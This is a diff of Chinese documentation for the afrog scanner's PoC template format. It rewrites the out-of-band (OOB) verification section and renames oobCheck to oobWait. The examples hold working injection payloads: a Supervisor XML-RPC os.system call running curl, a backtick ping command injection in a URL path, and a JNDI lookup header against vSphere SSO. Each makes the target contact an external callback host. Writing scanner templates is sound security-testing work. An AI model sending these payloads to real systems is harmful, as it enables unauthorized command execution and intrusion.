@@ -813,28 +813,19 @@ expression: r0()
 "目标正则".rmatches(response_text)
 ```
 
-### oob()
+### OOB
 
-`oob()` 用于执行无回显的命令的 POC，通过调用外部链接平台，在等待几秒钟后请求该外部链接平台，以验证是否成功接收到命令执行的信号。
+OOB（带外）用于验证“无回显”的漏洞利用：先让目标主动访问一段外部地址，再通过 OOB 平台查询是否收到访问记录。
 
-oob() 漏洞验证要求配置 oob() 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)
+OOB 漏洞验证要求先配置 OOB 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)
 
 基本用法
 
-set 声明两个变量
+PoC 中默认提供 `oob` 变量，无需再在 `set:` 中初始化。
 
-`oob`: 初始化一个 dnslog
-
-`oobHTTP`: dnslog 的 url，比如 http://xxxxxx.xxyyy.ceye.io，一般用于 curl {{oobHTTP}} 操作
-
-`oobDNS`: dnslog 的 host，比如 xxyy.ceye.io，一般用于 ping {{oobDNS}} 操作
-
-```
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
-  oobDNS: oob.DNS
-```
+- `{{oob.HTTP}}`：OOB 的 HTTP URL，一般用于 `curl {{oob.HTTP}}`
+- `{{oob.DNS}}`：OOB 的 DNS 域名，一般用于 `ping {{oob.DNS}}`
+- `oobWait(oob, protocol, timeout)`：等待 OOB 命中（`protocol` 可用 `oob.ProtocolHTTP/oob.ProtocolDNS` 或 `"http"/"dns"`）
 
 #### OOB HTTP
 
@@ -846,9 +837,6 @@ info:
   author: zan8in
   severity: info
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
@@ -860,11 +848,11 @@ rules:
           <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
           <params>
           <param>
-          <string>curl {{oobHTTP}}</string>
+          <string>curl {{oob.HTTP}}</string>
           </param>
           </params>
         </methodCall>
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+    expression: oobWait(oob, oob.ProtocolHTTP, 3)
 expression: r0()
 ```
 
@@ -897,15 +885,12 @@ info:
   author: zan8in
   severity: info
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
 rules:
   r0:
     request:
       method: GET
-      path: /cmd=`ping {{oobDNS}}`
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+      path: /cmd=`ping {{oob.DNS}}`
+    expression: oobWait(oob, oob.ProtocolDNS, 3)
 expression: r0()
 ```
 
@@ -927,17 +912,14 @@ info:
   author: zan8in
   severity: info
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
 rules:
   r0:
     request:
       method: GET
       path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
       headers:
-        X-Forwarded-For: "${jndi://{{oobDNS}}}"
-    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+        X-Forwarded-For: "${jndi://{{oob.DNS}}}"
+    expression: oobWait(oob, oob.ProtocolDNS, 3)
 expression: r0()
 ```
 
